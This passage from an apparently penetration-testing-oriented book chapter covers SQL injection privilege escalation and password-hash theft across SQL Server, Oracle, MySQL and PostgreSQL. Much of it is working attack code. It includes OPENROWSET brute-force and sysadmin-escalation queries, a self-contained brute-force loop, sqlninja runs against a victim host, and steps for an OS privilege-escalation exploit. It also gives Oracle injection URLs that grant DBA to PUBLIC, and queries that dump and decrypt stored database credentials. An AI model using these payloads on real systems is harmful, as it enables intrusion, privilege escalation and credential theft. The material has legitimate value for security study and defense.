foo’ is a user of the database at address 10.0.2.2 and not of the \ndatabase where OPENROWSET  is first executed. Note also that to successfully perform the \nquery as user ‘ foo’ we must successfully authenticate, providing the correct password.  \nOPENROWSET  has a number of applications in SQL injection attacks, and in this case we \ncan use it to brute -force the password of the sa  account. There are three important bits to \nremember here:  \n• For the connection to be successful, OPENROWSET  must provide credentials that are valid \non the database on which the connection is performed. \n• OPENROWSET  can be used not only to connect to a remote database, but also to perform a \nlocal connection, in which case the query is performed with the privileges of the user \nspecified in the OPENROWSET  call.  \n• On SQL Server 2000, OPENROWSET  can be called by all users. On SQL Server 2005 and \n2008, it is disabled by default (but occasionally re -enabled by the DBA. So always worth a \ntry). \nThis means that if OPENROWSET is available, you can use it to brute -force the sa  \npassword and escalate your privileges. For example, take a look at the following query:  \nSELECT ∗ FROM OPENROWSET(‘ SQLOLEDB ’, ‘Network=DBMSSOCN;Address=;uid=sa;pwd=foo’, ‘select 1’)  \nIf foo is the correct password, the query will run and return 1, whereas if the password is \nincorrect, you will receive a message such as the following:  \nLogin failed for user ‘sa’.  \nIt seems that you now ha ve a way to brute -force the sa  password! Fire off your favorite \nword list and keep your fingers crossed. If you find the correct password, you can easily \nescalate privileges by adding your user (which you can find with system_user) to the sysadmin group using the sp_addsrvrolemember  procedure, which takes as parameters a user and a \ngroup to add the user to (in this case, obviously, sysadmin):  \nSELECT ∗ FROM OPENROWSET(‘ SQLOLEDB’ , ‘Network=DBMSSOCN;Address=;uid=sa;pwd=passw0rd’ , \n‘SELECT 1; EXEC master.dbo.sp_addsrvrolemember ‘‘appdbuser’’,‘‘sysadmin’’’)  \nThe SELECT 1  in the inner query is necessary because OPENROWSET  expects to return at least one \ncolumn. To retrieve the value of system_user , you can use one of the techniques that you saw \nearlier (e.g. casting its value to a numeric variable to trigger an error) or, if the application does not return enough information directly, you can use one of the blind SQL injection techniques that you will see in Chapter 5 . Alternatively, you can inject the following query, which will \nperform the whole process in only one request, by constructing a string @q containing the \nOPENROWSET  query and the correct username, and then executing that query by passing @q \nto the xp_execresultset  extended procedure, which on SQL Server 2000 can be called by all \nusers:  \nDECLARE @q nvarchar(999);  \nSET @q = N‘SELECT 1 FROM OPENROWSET(‘‘SQLOLEDB’’, \n‘‘Network=DBMSSOCN;Address=;uid=sa;pwd=passw0rd’’,‘‘SELECT 1; EXEC \nmaster.dbo.sp_adds rvrolemember ‘‘‘‘‘+system_user+’’’’’,‘‘‘‘sysadmin’’’’ ’’)’;  \nEXEC master.dbo.xp_execresultset @q, N‘master’  \nWarning  \nRemember that the sa account works only if mixed authentication is enabled on the target SQL Server. When \nmixed authentication is used, both Windows users and local SQL Server users (such as sa ) can authenticate to the \ndatabase. However, if Windows -only authentication is configured on the remote database server, only Windows \nusers will be able to access the database and the sa  account will not be available. You could technically attempt to \nbrute -force the password of a Windows user who has administrative access (if you know the user’s name), but \nyou might block the account if a lockout policy is in place, so proceed with caution in that case.  \nTo detect which of the two possible authentication modes is in place (and therefore whether the attack can be \nattempted) you can inject the following code:  \nselect serverproperty(‘IsIntegratedSecurityOnly’)  \nThis query will return 1  if Windows -only authentication is in place, and 0  otherwise.  \nOf course, it would be impractical to perform a brute -force attack by hand. Putting together \na script that does the job in an automated way is not a big task, but there are already free tools \nout there that implement the whole process, such as Bobcat, Burp Intruder, and sqlninja (all \nwritten by authors of this book). We will use sqlninja (which you can download at \nhttp://sqlninja.sourceforge.net ) for an example of this attack. First we check wheth er we have \nadministrative privileges (the output has been reduced to the most important parts):  \nicesurfer@psylocibe ∼ $ ./sqlninja -m fingerprint  \nSqlninja rel. 0.2.6  \nCopyright (C)2011 icesurfer <r00t@northernfortress.net>  \n[+] Parsing sqlninja.conf…  \n[+] Target is: www.victim.com:80  \nWhat do you want to discover ?  \n 0 - Database version (2000/2005/2008)  \n 1 - Database user  \n 2 - Database user rights  \n 3 - Whether xp_cmdshell is working  \n 4 - Whether mixed or Windows- only authentication is used  \n 5 - Whether SQL Server runs as System  \n  (xp_cmdshell must be available)  \n 6 - Current database name  \n a - All of the above  \n h - Print this menu  \n q – exit \n> 2 \n[+] Checking whether user is member of sysadmin server role… You are not an administrator.  \nSqlninja uses a WAITFOR DELAY  to check whether the current user is a member of the \nsysadmin group, and the answer is negative. We therefore feed sqlninja with a word list (the \nfile wordlist.txt) and launch it in brute -force mode:  \nicesurfer@psylocibe ∼ $ ./sqlninja -m bruteforce -w wordlist.txt  \nSqlninja rel. 0.2.6  \nCopyright (C) 2006 –2011 icesurfer <r00t@northernfortress.net>  \n[+] Parsing configuration file………..  \n[+] Target is: www.victim.com:80  \n[+] Wordlist has been specified: using dictionary- based bruteforce  \n[+] Bruteforcing the sa password. This might take a while  \n dba password is…: s3cr3t  \nbruteforce took 834 seconds  \n[+] Trying to add current user to sysadmin group  \n[+] Done! New connections will be run with administrative privileges!  \nBingo! It seems that sqlninja found the right password, and used it to add the current user to \nthe sysadmin group, as we can easily check by rerunning sqlninja in fingerprint mode:  \nicesurfer@psylocibe ∼ $ ./sqlninja -m fingerprint  \nSqlninja rel. 0.2.6  \nCopyright (C) 2006 -2011 icesur fer <r00t@northernfortress.net>  \n[+] Parsing sqlninja.conf…  \n[+] Target is: www.victim.com:80  \nWhat do you want to discover ?  \n 0 - Database version (2000/2005/2008)  \n 1 - Database user  \n 2 - Database user rights  \n 3 - Whether xp_cmdshell is working  \n 4 - Whether mixed or Windows- only authentication is used  \n 5 - Whether SQL Server runs as System  \n  (xp_cmdshell must be available)  \n 6 - Current database name  \n a - All of the above  \n h - Print this menu  \n q - exit \n> 2 \n [+] Checking whether user is member of sysadmin server role…You are an administrator !  \nIt worked! Our user now is an administrator, which opens up a lot of new scenarios . \nTools & traps… \nUsing the Database’s Own Resources to Brute- Force  \nThe attack we just discussed performs one request to the back -end database for each candidate password. This \nmeans that a very large number of requests will be performed, and this in turn means that a significant amount of \nnetwork resources will be needed with a large number of entries appearing on the Web server and database server \nlogs. However, this is not the only way that a brute -force attack can be performed: Using a bit of SQL magic, it is \npossible to inject a single query that independently performs  the whole brute -force attack. The concept was first \nintroduced by Chris Anley in his paper “(more) Advanced SQL injection” back in 2002, and it was then \nimplemented by Bobcat and sqlninja.  \nBobcat, available at www.northern -monkee.co.uk , runs on Windows and uses a dictionary -based approach, \ninjecting a query that performs an out -of-band (OOB) connection to the attacker’s database server to fetch a table \ncontaining a list of candidate passwords and then try them locally. We will talk about Bobcat in more detail at the \nend of this chapter.  \nSqlninja, when implementing this concept, uses a pure brute -force approach, injecting a query that tries every \npassword that can be generated with a given charset and a given length. Here is an example of an attack query \nused by sqlninja for a password of two characters on SQL Server 2000:  \ndeclare @p nvarchar(99),@z nvarchar(10),@s nvarchar(99), @a int, @b int, @q nvarchar (4000);  \nset @a=1; set @b=1;  \nset @s=N‘abcdefghijklmnopqrstuvwxyz0123456789’;  \n while @a<37 begin  \nwhile @b<37 begin set @p=N’’; -- We reset the candidate password;  \n  set @z = substring(@s,@a,1); set @p=@p+@z;  \n  set @z = substring(@s,@b,1); set @p=@p+@z;  \n  set @q=N‘select 1 from OPENROWSET(‘‘SQLOLEDB’’, ‘‘Network= DBMSSOCN; Address=;uid=sa;pwd=‘+@p+N’’’,  \n ‘‘select 1; exec master.dbo.sp_addsrvrolemember  \n ‘‘‘‘‘ + system_user + N’’’’’, ‘‘‘‘sysadmin’’’’’’)’;  \n  exec master.dbo.xp_execresultset @q,N‘master’;  \n set @b=@b+1; end;  \nset @b=1; set @a=@a+1; end;  \nWhat happens here? We start storing our character set in the variable @s, which in this case contains letters \nand numbers but could be extended to other symbols (if it contains single quotes, the code will need to make sure \nthey are correctly escaped). Then we create two nested cycles, controlled by the variables @a  and @b that work \nas pointers to the character set and are used to generate each candidate password. When the candidate password is \ngenerated and stored in the variable @p, OPENROWSET  is called, trying to execute sp_addsrvrolemember  to add \nthe current user ( system_user ) to the administrative group ( sysadmin ). To avoid the query stopping in case of \nunsuccessful authentication of OPENROWSET , we store the query into the variable @q and execute it wit h \nxp_execresultset . \nIt might look a bit complicated, but if the administrative password is not very long it is a very effective way for \nan attacker to escalate his privileges. Moreover, the brute -force attack is performed by using the database server’s \nown CPU resources, making it a very elegant way to perform a privilege escalation.  \nHowever, be very careful when using this technique against a production environment, as it can easily push the \nCPU usage of the target system up to 100% for the whole time, pos sibly decreasing the quality of services for \nlegitimate users.  \nAs you have seen, OPENROWSET  is a very powerful and flexible command that can be \nabused in different ways, from transferring data to the attacker’s machine to attempting a \nprivilege escalation.  This is not all, however: OPENROWSET  can also be used to look for SQL \nServer installations that have weak passwords. Have a look at the following query:  \nSELECT ∗ FROM OPENROWSET(‘ SQLOLEDB’ , ‘Network=DBMSSOCN; Address=10.0.0.1;uid=sa; pwd=’ , \n‘SELECT 1’ ) \nThis query will attempt to authenticate to an SQL Server at the address 10.0.0.1 as sa  using \nan empty password. It is quite easy to create a cycle that will try such queries on all of the IP \naddresses of a network segment, saving the results in a temporary t able that you can extract at \nthe end of the process using one of the methods you have seen so far.  \nIf you are dealing with SQL Server 2005 or 2008 and you don’t have administrative \nprivileges, checking for the availability of OPENROWSET should be one of your first tests. \nYou can perform the check using the following query:  \nselect value_in_use from sys.configurations where name LIKE ‘Ad Hoc%’  \nIf OPENROWSET is available, this query will return 1, and 0 otherwise.  \nPrivilege Escalation on Unpatched Servers  \nOPENROWSET  is not the only privilege escalation vector on SQL Server: If your target database \nserver is not fully updated with the latest security patches, it might be vulnerable to one or more well -known attacks. \nSometimes network administrators do not have the resources to ensure that all the servers on \ntheir networks are constantly updated. Other times, they simply lack the awareness to do so. Yet other times, if the server is particularly critical and the security fix has not been carefully tested in an isolated environment, the update process could be kept on hold for days or even weeks, leaving the attacker with a window of opportunity. In these cases, a precise fingerprinting of the remote server is paramount in determining which flaws might be present and whether they can be safely exploited.  \nA very good example is MS09- 004, a heap overflow found by Bernhard Mueller in the \nsp_replwritetovarbin  stored procedure on SQL Server 2000 and 2005. When successfully \nexploited, it enables the attacker to run arbitrary code with administrative  privileges on the \naffected host; exploit code was made publicly available shortly after the vulnerability was published. You can exploit the vulnerability through SQL injection by in jecting a malicious \nquery that calls \nsp_replwritetovarbin , overflowing the memory space and executing the \nmalicious shell code. However, a failed exploitation can cause a denial of service (DoS) condition, so be careful if you attempt this attack! Especial ly starting with Windows 2003, \nData Execution Prevention (DEP) is enabled by default, meaning that the operating system will stop any attempt to execute code in areas of memory not allocated to code, and it will do this by killing the offending process (SQ LSERVR.EXE in this case). More information about this \nvulnerability is available at www.securityfocus.com/bid/32710, and sqlmap has a module to exploit this vulnerability.  \nAnother scenario is the following: your queries might be executed as ‘sa’, but the \nSQLSERVR.EXE process runs as a low -privileged account, which might stop you from \ncarrying out some specific attacks, for instance using sqlninja to inject the VNC DLL from \nMetasploit and obtain GUI acce ss to the database server (see Chapter 6  for more information \non this). In this case, if the operating system is not fully patched you can try exploiting it in order to elevate the privileges of SQL Server. Techniques to achieve this include token kidnaping ( www.argeniss.com/research/TokenKidnapping.pdf ) and successful exploitation of \nCVE -2010- 0232. Both sqlninja and sqlmap can help you in automating t hese attacks.  \nAs an example, let’s see sqlninja at work with the more recent CVE -2010 -0232. Sqlninja is \nshipped with a customized version of the original exploit by Tavis Ormandy. When the exploit is called with the “sql” parameter, it will look for the SQ LSERVR.EXE process and elevate its \nprivileges to SYSTEM. In order to perform the attack, you will need to perform the following:  \n• Use the fingerprint mode ( -m fingerprint) to check that xp_cmdshell is working (option 3) \nand that SQLSERVR.EXE does not run as SYSTEM (option 5). \n• Use the upload mode ( -m upload) to transfer vdmallowed.exe (option 5) and vdmexploit.dll \n(option 6) to the remote server.  \n• Use the command mode ( -m command) to execute the exploit by running \n“%TEMP% \\\\vdmallowed.exe sql” (without quotes).  \nIf the remote Windows server is not patched against this vulnerability, the fingerprint mode \nwill now confirm that SQL Server is now running as SYSTEM!  \nsqlmap also provides full support for this attack, via Metasploit’s getsystem  command. \nOracle  \nPrivilege escalation via Web application SQL injection in Oracle can be quite difficult because most approaches for privilege escalation attacks require PL/SQL injection, which is less common, however if we have access to \ndbms_xmlquery.newcontext()  or dbms_xmlquery.getxml()  \n(accessible to PUBLIC by default), as discussed earlier  in “Hacking Oracle Web \nApplications,” we can perform injection via anonymous PL/SQL code blocks. \nOne example not requiring PL/SQL injection uses a vulnerability found in the Oracle \ncomponent mod_plsql . The following URL shows a privilege escalation via the driload package \n(found by Alexander Kornbrust). This package was not filtered by mod_plsql  and allowed any \nWeb user a privilege escalation by entering the following URL:  \nhttp://www .victim.com/pls/dad/ctxsys.driload.validate_stmt?sqlstmt=GRANT+DBA+TO+PUBLIC  \nMost PL/SQL privilege escalation exploits (many available on www.milw0rm.com ) use the \nfollowing concept:  \n1. Create a payload which grants DB A privileges to the public role. This is less obvious than \ngranting DBA privileges to a specific user. This payload will be injected into a vulnerable \nPL/SQL procedure in the next step:  \nCREATE OR REPLACE FUNCTION F1 return number  \nauthid current_user as  \npragma autonomous_transaction;  \nBEGIN  \nEXECUTE IMMEDIATE ‘GRANT DBA TO PUBLIC’;  \nCOMMIT;  \nRETURN 1;  \nEND; \n/ \n2. Inject the payload into a vulnerable package:  \nexec sys.kupw$WORKER.main(‘x’,‘YY’’ and 1=user12.f1 --  mytag12’);  \n3. Enable the DBA role:  \nset role DBA;  \n4. Revoke the DBA role from the public role:  \nrevoke DBA from PUBLIC;  \nThe current session still has DBA privileges, but this will no longer be visible in the Oracle \nprivilege tables.  \nSome example privilege escalation vulnerabilities in Oracle are SYS.LT and \nSYS.DBMS_CDC_PUBLISH, which are both discussed below.  \nSYS.LT  \nIf the database user has the CREATE PROCEDURE privilege than we can create a malicious \nfunction within the user’s schema and inject the function within a vulnerable object of the SYS.LT package (fi xed by Oracle in April 2009). The end result  is that our malicious function \ngets executed with SYS permissions and we get DBA privileges:  \n-- Create Function  \nhttp://www.victim.com/index.jsp?id=1 and (select dbms_xmlquery.newcontext(‘declare PRAGMA \nAUTONOMOUS_TRANSACTION; begin execute immediate ‘‘create or replace function pwn2 return \nvarchar2 authid current_user is PRAGMA autonomous_transaction;BEGIN execute immediate ‘‘‘‘grant dba to public’’’’;commit;return ‘‘‘‘z’’’’;END; ’’; commit; end;’) from dual) is not null --\n \n-- Exploiting SYS.LT  \nhttp://www.victim.com/index.jsp?id=1 and (select dbms_xmlquery.newcontext(‘declare PRAGMA \nAUTONOMOUS_TRANSACTION; begin execute immediate ‘‘ begin \nSYS.LT.CREATEWORKSPACE(‘‘‘‘A10‘‘‘‘‘‘‘‘ and \nscott.pwn2()=’’’’’’’’x’’’’);SYS.LT.REMOVEWORKSPACE(‘‘‘‘A10‘‘‘‘‘‘‘‘  and \nscott.pwn2()=’’’’’’’’x’’’’);end;’’; commit; end;’) from dual) is not null –  \nSYS.DBMS_CDC_PUBLISH  \nAnother more recent issue that was fixed by Oracle in October 2010 (in Versions 10gR1, \n10gR2, 11gR1, and 11gR2) is found in the package sys.dbms_cdc_publi sh.create_change_set, \nwhich allows a user with the privilege execute_catalog_role to become DBA:  \nhttp://www.victim.com/index.jsp?id=1 and (select dbms_xmlquery.newcontext(‘declare PRAGMA \nAUTONOMOUS_TRANSACTION; begin execute immediate ‘‘ begin \nsys.dbms_cdc_publish.create_change_set(‘‘‘‘a’’’’,‘‘‘‘a’’’’,‘‘‘‘a‘‘‘‘‘‘‘‘||SCOTT.pwn2()||’’’’’’’’a’’’’,‘‘‘‘Y’’’’,sysdate,sysdate);end;’’; commit; end;’) from dual) is not null --\n \nGetting Past the CREATE PROCEDURE Privilege  \nOne of the disadvantages of this approach is t he requirement of having the CREATE \nPROCEDURE privilege. In scenarios where our user doesn’t have this privilege, we can \novercome this hurdle by taking advantage of one of the following techniques and common issues.  \nCursor Injection  \nDavid Litchfield presen ted a solution to this problem at the BlackHat DC 2009 conference. In \nOracle 10g, we can get past the problem of create function by using cursors to inject PL/SQL as follows:  \nhttp://www.victim.com/index.jsp?id=1 and (select dbms_xmlquery.newcontext(‘declare PRAGMA \nAUTONOMOUS_TRANSACTION; begin execute immediate ‘‘DECLARE D NUMBER;BEGIN D:= \nDBMS_SQL.OPEN_CURSOR; DBMS_SQL.PARSE(D,‘‘‘‘declare pragma autonomous_transaction; begin execute immediate ‘‘‘‘‘‘‘‘grant dba to public’’’’’’’’;commit;end;’’’’,0);SYS.LT.CR\nEATEWORKSPACE(‘‘‘‘a’’’’’’’’ and \ndbms_sql.execute(‘‘‘‘||D||’’’’)=1-- ’);SYS.LT.COMPRESSWORKSPACETREE(‘‘‘‘a’’’’’’’’ and \ndbms_sql.execute(‘‘‘‘||D||’’’’)=1-- ’’’’);end;’’; commit; end;’) from dual) is not null --  \nNote that this cursor injection technique is not possible in Oracle 11g and later.  \nSYS.KUPP$PROC  \nAnother function that comes with Oracle that allows you to execute any PL/SQL statement is \nSYS.KUPP$PROC.CREATE_MASTER_PROCESS(). Note that this function is only executable by users with the DBA role, however  in instances where we have identified a \nvulnerable procedure we can use this to execute PL/SQL as shown below:  \nselect dbms_xmlquery.newcontext(‘declare PRAGMA AUTONOMOUS_TRANSACTION; begin execute \nimmediate ‘‘ begin \nsys.vulnproc(‘‘‘‘a‘‘‘‘‘‘‘‘||sys.kupp$proc.create_master_process(‘‘‘‘‘‘‘‘EXECUTE IMMEDIATE \n‘‘‘‘‘‘‘‘‘‘‘‘‘‘‘‘DECLARE PRAGMA AUTONOMOUS_TRANSACTION; BEGIN EXECUTE IMMEDIATE ‘‘‘‘‘‘‘‘‘‘‘‘‘‘‘‘‘‘‘‘‘‘‘‘‘‘‘‘‘‘‘‘GRANT DBA TO PUBLIC’’’’’’’’’’’’’’’’’’’’’’’’’’’’’’’’; END; ’’’’’’’’’’’’’’’’;’’’’’’’’)||’’’’’’’’a’’’’);end;’’; commit; end;’) from dual\n \nWeak Permissions  \nIt is common to see database permissions being overlooked, and often database users may have \npermissions which could indirectly allow privilege escalation attacks. Some of these permissions are:  \n• CREATE ANY VIEW  \n• CREATE ANY TRIGGER  \n• CREATE ANY PROCEDURE  \n• EXECUTE ANY PROCEDURE  \nThe main reason why these privileges are dangerous is that they allow the grantee to create \nobjects (views, triggers, procedures, etc.) in the schema of other users, including the SYSTEM schema. These objects, when executed, execute with the privilege of owner and hence allow for privilege escalation.  \nAs an example, if the database user had CREATE ANY TRIGGER permission then they \ncould use this to grant themself the DBA role. First, we can make our user create a trigger \nwithin the system schema. The trigger, when invoked will execute the DDL statement GRANT DBA TO PUBLIC:  \nselect dbms_xmlquery.newcontext(‘declare PRAGMA AUTONOMOUS_TRANSACTION; begin execute \nimmediate ‘‘create or replace trigger “SYSTEM”.the_trigger before insert on system.OL$ for \neach row declare pragma autonomous_transaction; BEGIN execute immediate ‘‘‘‘GRANT DBA TO PUBLIC’’’’; END the_trigger;’’;end;’) from dual\n \nNotice that the trigger is invoked when an insert is made on the table SYSTEM.OL$, which \nis a special table with PUBLIC having insert rights on this table.  \nNow, we can do an insert on this table and the end result is that the trigger \nSYSTEM.the_trigger gets executed with SYSTEM privileges granting DBA role to PUBLIC:  \nselect dbms_xmlquery.newcontext(‘declare PRAGMA AUTONOMOUS_TRANSACTION; begin execute \nimmediate ‘‘ insert into SYSTEM.OL$(OL_NAME) VALUES (‘‘‘‘JOB Done!!!’’’’) ’’;end;’)from dual\n \n \nStealing the password hashes  \nWe briefly talked about hashing functions earlier in this chapter, when we discussed a \nsuccessful attack that recovered the passwords of the application users. In this section, we’ll talk about hashes again, this time regarding the database users. On all common database server technologies, user passwords are stored using a non- reversible hash (the exact algorithm used \nvaries depending on the database server and version, as you will se e shortly) and such hashes \nare stored, you guessed it, in a database table. To read the contents of that table you normally will need to run your queries with administrative privileges, so if your user does not have such privileges you should probably return to the privilege escalation section.  \nIf you manage to capture the password hashes, various tools can attempt to retrieve the \noriginal passwords that generated the hashes by means of a brute -force attack. This makes the \ndatabase password hashes one of the most common targets in any attack: Because users often reuse the same password for different machines and services, being able to obtain the passwords of all users is usually enough to ensure a relatively easy and quick expansion in the target network.  \nSQL Server  \nIf you are dealing with a Microsoft SQL Server, things vary quite a lot depending on the version you are dealing with. In all cases, you need administrative privileges to access the hashes, but differences start to surface when you actually try t o retrieve them and, more \nimportantly, when you try to crack them to obtain the original passwords.  \nOn SQL Server 2000, hashes are stored in the sysxlogins  table of the master  database. You \ncan retrieve them easily with the following query:  \nSELECT name,password FROM master.dbo.sysxlogins  \nSuch hashes are generated using pwdencrypt() , an undocumented function that generates a \nsalted hash, where the salt is a function of the current time. For instance, here is the hash of the \nsa password on one of the SQL Servers that I use in my tests: \n0x0100E21F79764287D299F09FD4B7EC97139C7474CA1893815231E9165D257ACEB815111F2AE98359F40F84F3CF\n4C \nThis hash can be split into the following parts:  \n• 0x0100:  Header  \n• E21F7976:  Salt \n• 4287D299F09FD4B7EC97139C7474CA1893815231:  Case- sensitive hash \n• E9165D257ACEB815111F2AE98359F40F84F3CF4C:  Case -insensitive hash  \nEach hash is generated using the user’s password and the salt as input for the SHA1 \nalgorithm. David Litchfield performed a full analysis of the hash generation of SQL Server \n2000, and it is available at the address www.nccgroup.com/Libraries/Document_Downloads/Microsoft_SQL_Server_Passwords_Cracking_the_password_hashes.sflb.ashx . What is interesting to us is the fact that on SQL Server \n2000 passwords are case -insensitive, which simplifies the job of cracking them. \nTo crack the hashes you can use the tools NGSSQLCrack \n(www.ngssecure.com/services/information -security -software/ngs -sqlcrack.aspx ) or Cain & \nAbel ( www.oxid.it/cain.html ). \nWhen developing SQL S erver 2005 (and consequently SQL Server 2008), Microsoft took a \nfar more aggressive stance in terms of security, and implementation of the password hashing \nclearly shows the paradigm shift. The sysxlogins  table has disappeared, and hashes can be \nretrieved by querying the sql_logins  view with the following query:  \nSELECT password_hash FROM sys.sql_logins  \nHere’s an example of a hash taken from SQL Server 2005:  \n0x01004086CEB6A15AB86D1CBDEA98DEB70D610D7FE59EDD2FEC65  \nThe hash is a modification of the old SQL Server 2000 hash:  \n• 0x0100:  Header  \n• 4086CEB6:  Salt \n• A15AB86D1CBDEA98DEB70D610D7FE59EDD2FEC65:  Case- sensitive hash  \nAs you can see, Microsoft removed the old case -insensitive hash. This means your brute -\nforce attack will have to try a far larger number of password candidates to succeed. In terms of \ntools, NGSSQLCrack and Cain & Abel are still your best friends for this attack.  \nDepending on a number of factors, when retrieving a password hash the Web application \nmight not always return the hash in a nice hexadecimal format. It is therefore recommended that you explicitly cast its value into a hex string using the function  fn_varbintohexstr() . For \ninstance:  \nhttp://www.victim.com/products.asp?id=1+union+select+master.dbo.fn_varbintohexstr(password_h\nash)+from+sys.sql_logins+where+name+=+‘sa’  \nMySQL  \nMySQL stores its password hashes in the mysql.user  table. Here is the query to extract them \n(together with the usernames they belong to): \nSELECT user,password FROM mysql.user;  \nPassword hashes are calculated using the PASSWORD()  function, but the exact algorithm \ndepends on the version of MySQL that is installed. Before 4.1, a simple 1 6-character hash was \nused:  \nmysql> select PASSWORD(‘password’)  \n+---------------------- + \n| password(‘password’) |  \n+---------------------- + \n| 5d2e19393cc5ef67 |  \n+---------------------- + \n1 row in set (0.00 sec)  \nStarting with MySQL 4.1, the PASSWORD()  function was modified to generate a far longer (and \nfar more secure) 41 -character hash, based on a double SHA1 hash:  \nmysql> select PASSWORD(‘password’)  \n+------------------------------------------- + \n| password(‘password’) |  \n+----------------------------------------- --+ \n| ∗2470C0C06DEE42FD1618BB99005ADCA2EC9D1E19 |  \n+-------------------------------------------+  \n1 row in set (0.00 sec)  \nNote the asterisk at the beginning of the hash. It turns out that all password hashes generated \nby MySQL (4.1 or later) start with an asterisk, so if you stumble into a hexadecimal string that \nstarts with an asterisk and is 41 characters long, it’s likely there is a MySQL installation in the neighborhood.  \nOnce you have captured the password hashes, you can attempt to recover the original \npasswords with John the Ripper ( www.openwall.com/john/ ) or Cain & Abel ( www.oxid.it ). If \nthe hashes you have extracted come from an installation of MySQL 4.1 or later, you need to patch John the Ripper with the “John BigPatch,” which you can find at www.banquise.net/misc/patch- john.html . \nPostgreSQL  \nIf you happen to have administrative privileges, and therefore you can access the table pg_shadow, you can easily extract the password hashes with one of the following queries:  \nSELECT usename , passwd FROM pg_shadow  \nSELECT rolname, rolpassword FROM pg_authid  \nWith PostgreSQL passwords are by default hashed with MD5, which makes a brute -force \nattack very efficient. However, keep in mind that PostgreSQL concatenates the password and the username before the hash function is called. Also, the string ‘md5’ is prepended to the hash. In other words, if the username is ‘bar’ and the password is ‘foo,’ the hash will be the following:  \nHASH = ‘md5’ || MD5(‘foobar’) = md53858f62230ac3c915f300c664312c63f  \nYou might wonder why PostgreSQL needs to prepend the string ‘md5’ to the hash: that is \nfor being able to tell whether the value is a hash or the password itself. Yes, you got this right: \nPostgreSQL allows for the password to be stored in clear text with the following query:  \nALTER USER username UNENCRYPTED PASSWORD ‘letmein’  \nOracle  \nOracle stores its password hashes for database accounts in the password column of the \nsys.user$  table. The dba_users  view points to this table, but since Oracle 11g the Data \nEncryption Standard (DES) password hashes are no longer visible in the dba_users view. The \nsys.user$  table contains the password hashes of database users ( type#=1 ) and database roles \n(type#=0 ). With Oracle 11g, Oracle introduced a new way of hashing Oracle passwords \n(SHA1 instead of DES) and support for mixed- case characters in passwords. The old DES \nhashes represent case- insensitive uppercase passwords, making them relatively easy to crack. \nThe new hashes in 11g are stored in the same table but in a different column, called spare4. By default, Oracle 11g saves the old (DES) and the new (SHA1) password hashes in the same table, so an attacker has a choice between cracking old or new passwords.  \nQueries for extracting password hashes (together with the usernames they belong to) are as \nfollows. \nFor Oracle DES user passwords:  \nSelect use rname,password from sys.user$ where type#>0 andlength(password)=16  \nFor Oracle DES role passwords:  \nSelect username,password from sys.user$ where type#=1 andlength(password)=16  \nFor Oracle SHA1 passwords (11g+):  \nSelect username, substr(spare4,3,40) hash, substr(spare4,43,20) salt fromsys.user$ where \ntype#>0 and length(spare4)=62;  \nVarious tools (Checkpwd, Cain & Abel, John the Ripper, woraauthbf, GSAuditor, and \norabf) are available for cracking Oracle passwords. The fastest tools so far for Oracle DES passwords  are woraauthbf, from László Tóth, and GSAuditor for SHA1 Oracle hashes. Refer \nto Figure 4.15 for examples of Oracle hashes being returned via SQL injection.  \n \nFigure 4.15  Oracle Hash Examples  \nMany other tables in the Oracle database (installed by Oracle itself) also contain password \nhashes, encrypted passwords, or sometimes even clear -text passwords. Often, it is easier to \nretrieve the (clear -text) password instead of cracking it. One example where you often can find \nthe clear -text password of the SYS user is the sysman.mgmt_credentials2 table. During \ninstallation Oracle asks  whether the installer wants to use the same password for all DBA \naccounts. Oracle saves the encrypted password of user DBSNMP  (which is identical to SYS \nand SYSTEM) in the mgmt_credentials2 table if the answer was “yes.” By accessing this table, \nit is often possible to get the SYS/SYSTEM password. \nHere are some SQL statements that will often return clear -text passwords:  \n-- get the cleartext password of the user MGMT_VIEW (generated by Oracle  \n-- during the installation time, looks like a hash but is a password)  \nselect view_username, sysman.decrypt(view_password) Password from \nsysman.mgmt_view_user_credentials;  \n-- get the password of the dbsnmp user, databases listener and OS  \n\n-- credentials  \nselect sysman.decrypt(t1.credential_value) sysmanuser, sysman.decrypt(t2.credential_value) \nPassword  \nfrom sysman.mgmt_credentials2 t1, sysman.mgmt_credentials2 t2  \nwhere t1.credential_guid=t2.credential_guid  \nand lower(t1.credential_set_column)=‘username’  \nand lower(t2.credential_set_column)=‘password’  \n-- get the username and password of the Oracle Knowledgebase Metalink  \nselect sysman.decrypt(ARU_USERNAME), sysman.decrypt(ARU_PASSWORD) from \nSYSMAN.MGMT_ARU_CREDENTIALS;  \nOracle Components  \nSeveral Oracle components an d products come with their own user management (e.g. Oracle \nInternet Directory) or they save passwords in various other tables, in more than 100 different \ntables in all. The following subsections discuss some of the types of hashes you might be able to fin d within the database with other Oracle products. \nAPEX  \nNewer Oracle database installations often contain Oracle Application Express (APEX). In 11g, this component (APEX 3.0) is installed by default. This Web application framework comes with its own (lightw eight) user management. The password hashes (MD5 until Version 2.2, \nsalted MD5 since Version 3.0) of this product are located in the FLOWS_xxyyzz  schema in the \nwwv_flow_fnd_user  table. Different versions of APEX use different schema names, with the \nschema name containing the version number of APEX (e.g. 020200 for APEX 2.2):  \nselect user_name,web_password_raw from flows_020000.wwv_flow_fnd_user;  \nselect user_name,web_password_raw from flows_020100.wwv_flow_fnd_user;  \nselect user_name,web_password_raw from flows_020200.wwv_flow_fnd_user;  \nSince APEX 3.0, the MD5 passwords are salted with the security_group_id and the \nusername , and are returned as follows:  \nselect user_name,web_password2,security_group_id from flows_030000.wwv_flow_fnd_user;  \nselect user_name,web_pa ssword2,security_group_id from flows_030000.wwv_flow_fnd_user;  \nOracle Internet Directory  \nOracle Internet Directory (OID), the Oracle Lightweight Directory Access Protocol (LDAP) \ndirectory, comes with many hashed passwords in various tables. You can access the password hashes of OID if you have normal access to all users in the company. For compatibility reasons, OID saves the same user password with different hashing algorithms (MD4, MD5, and SHA1).  \nThe following statements return the password hashes of OID  users:  \nselect a.attrvalue ssouser, substr(b.attrval,2,instr(b.attrval,‘}’)- 2) method,  \nrawtohex(utl_encode.base64_decode(utl_raw.cast_to_raw(substr  \n (b.attrval,instr(b.attrval,‘}’)+1)))) hash  \nfrom ods.ct_cn a,ods.ds_attrstore b  \nwhere a.entryid=b.entryid  \nand lower(b.attrname) in (  \n‘userpassword’,‘orclprpassword’,‘orclgupassword’,‘orclsslwalletpasswd’,  \n‘authpassword’,‘orclpassword’)  \nand substr(b.attrval,2,instr(b.attrval,‘}’)- 2)=‘MD4’  \norder by method,ssouser;  \nselect a.attrvalue ssouser, substr(b.attrval,2,instr(b.attrval,‘}’)- 2) method, \nrawtohex(utl_encode.base64_decode(utl_raw.cast_to_raw(substr  \n 